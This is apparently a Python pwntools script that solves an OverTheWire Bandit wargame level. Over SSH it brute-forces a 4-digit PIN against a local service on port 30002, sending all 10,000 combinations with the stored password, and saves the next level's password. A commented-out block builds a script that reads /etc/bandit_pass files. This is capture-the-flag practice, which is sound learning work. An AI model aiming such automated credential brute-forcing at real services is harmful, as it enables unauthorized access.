import os
import pwn

from tqdm import tqdm

pwn.context.log_level = "WARNING"

n = os.path.basename(__file__)
n = n.split(".")[0]
n = n[n.find("bandit")+6:]

username = f"bandit{n}"
hostname = "bandit.labs.overthewire.org"
password = None

with open(f"./bandit/password/{username}-password.txt") as f:
    password = f.read()

print(f"Connecting to {hostname}:2220")
print(f"Username : {username}")
print(f"Password : {password}")
print() 

connect = pwn.ssh(host=hostname, user=username, password=password, port=2220)

def send_command(command: list[str], connect: pwn.ssh = connect) -> pwn.tubes.ssh.ssh_channel:
    command = map(str, command)
    command = " ".join(command)
    
    print(f"Sending process : `{command}`", end="...")
    channel = connect.system(command)
    print("Done")
    
    print()

    return channel

def connect_remote(host: str = "127.0.0.1", port: int = 8000, timeout: int = None, connect: pwn.ssh = connect) -> pwn.tubes.ssh.ssh_connecter:
    print(f"Connecting to {host}:{port}", end="...")
    remote = connect.connect_remote(host, port, timeout=timeout)
    print("Done")

    print()

    return remote

def send_lines_remote(lines: list[str] | list[bytes], remote: pwn.tubes.ssh.ssh_connecter) -> None:
    if type(lines[0]) == str:
        lines = [s.encode() for s in lines]

    print(f"Sending {len(lines)} lines", end="...")
    remote.sendlines(lines)
    print("Done")

    print()

def receive_output(channel: pwn.tubes.ssh.ssh_channel | pwn.tubes.ssh.ssh_connecter, lines: int = None) -> str:
    output = None
    
    print("Receiving output", end="...")
    try:
        if not lines:
            output = channel.recv()
        else:
            output = b""

            for _ in range(lines):
                output += channel.recvline()

        output = output.decode()

        output = output.strip()
        output = output.strip("\n")
        print("Done")

        print(output)

    except EOFError:
        if not output:
            print("No output received")
        else:
            print(output.decode())

    except Exception as e:
        print(e)

    print()
    
    return output.decode()

if connect.connected():
    # dir = "/tmp/horse3903"

    # channel = send_command(["rm", "-rf", dir])

    # channel = send_command(["mkdir", dir])

    # channel = send_command(["cd", dir, "&&", "touch", "generate.sh"])
    
    # commands = ["'#/bin/bash'", "''", "'for i in {0..9}'", "'do '", "'\tfor j in {0..9}'", "'\tdo '", "'\t\tfor k in {0..9}'", "'\t\tdo '", "'\t\t\tfor n in {0..9}'", "'\t\t\tdo '", "'\t\t\t\techo $(cat /etc/bandit_pass/bandit24) $i$j$k$n >> output.txt'", "'\t\t\tdone'", "'\t\tdone'", "'\tdone'", "'done'"]
    
    # for c in commands:
    #     channel = send_command(["cd", dir, "&&", "echo", c, ">>", "generate.sh"])
    #     try:
    #         result = receive_output(channel)
    #     except EOFError:
    #         print("EOF")

    # channel = send_command(["cd", dir, "&&", "cat", "generate.sh"])
    # result = receive_output(channel)

    # channel = send_command(["cd", dir, "&&", "bash", "generate.sh"])

    data = [f"{password} {i:04}" for i in range(10000)]

    remote = connect_remote("127.0.0.1", 30002, 240000, connect)
    
    for i in range(125):
        st = i*80
        ed = st + 80
        
        print(f"Package {i+1} of 125 ({(i+1)/125*100:.02f}%) :")

        send_lines_remote(data[st:ed], remote)
        output = receive_output(remote, 80)
        output = output

        print()

        if output and "Correct!" in output:
            break

    output = output.splitlines()
        
    for idx, line in enumerate(output):
        if "Correct!" in line:
            result = output[idx+1]
            break

    result = result.split()
    result = result[-1]

    connect.close()

with open(f"./bandit/password/bandit{int(n)+1}-password.txt", "w+") as f:
    f.write(result)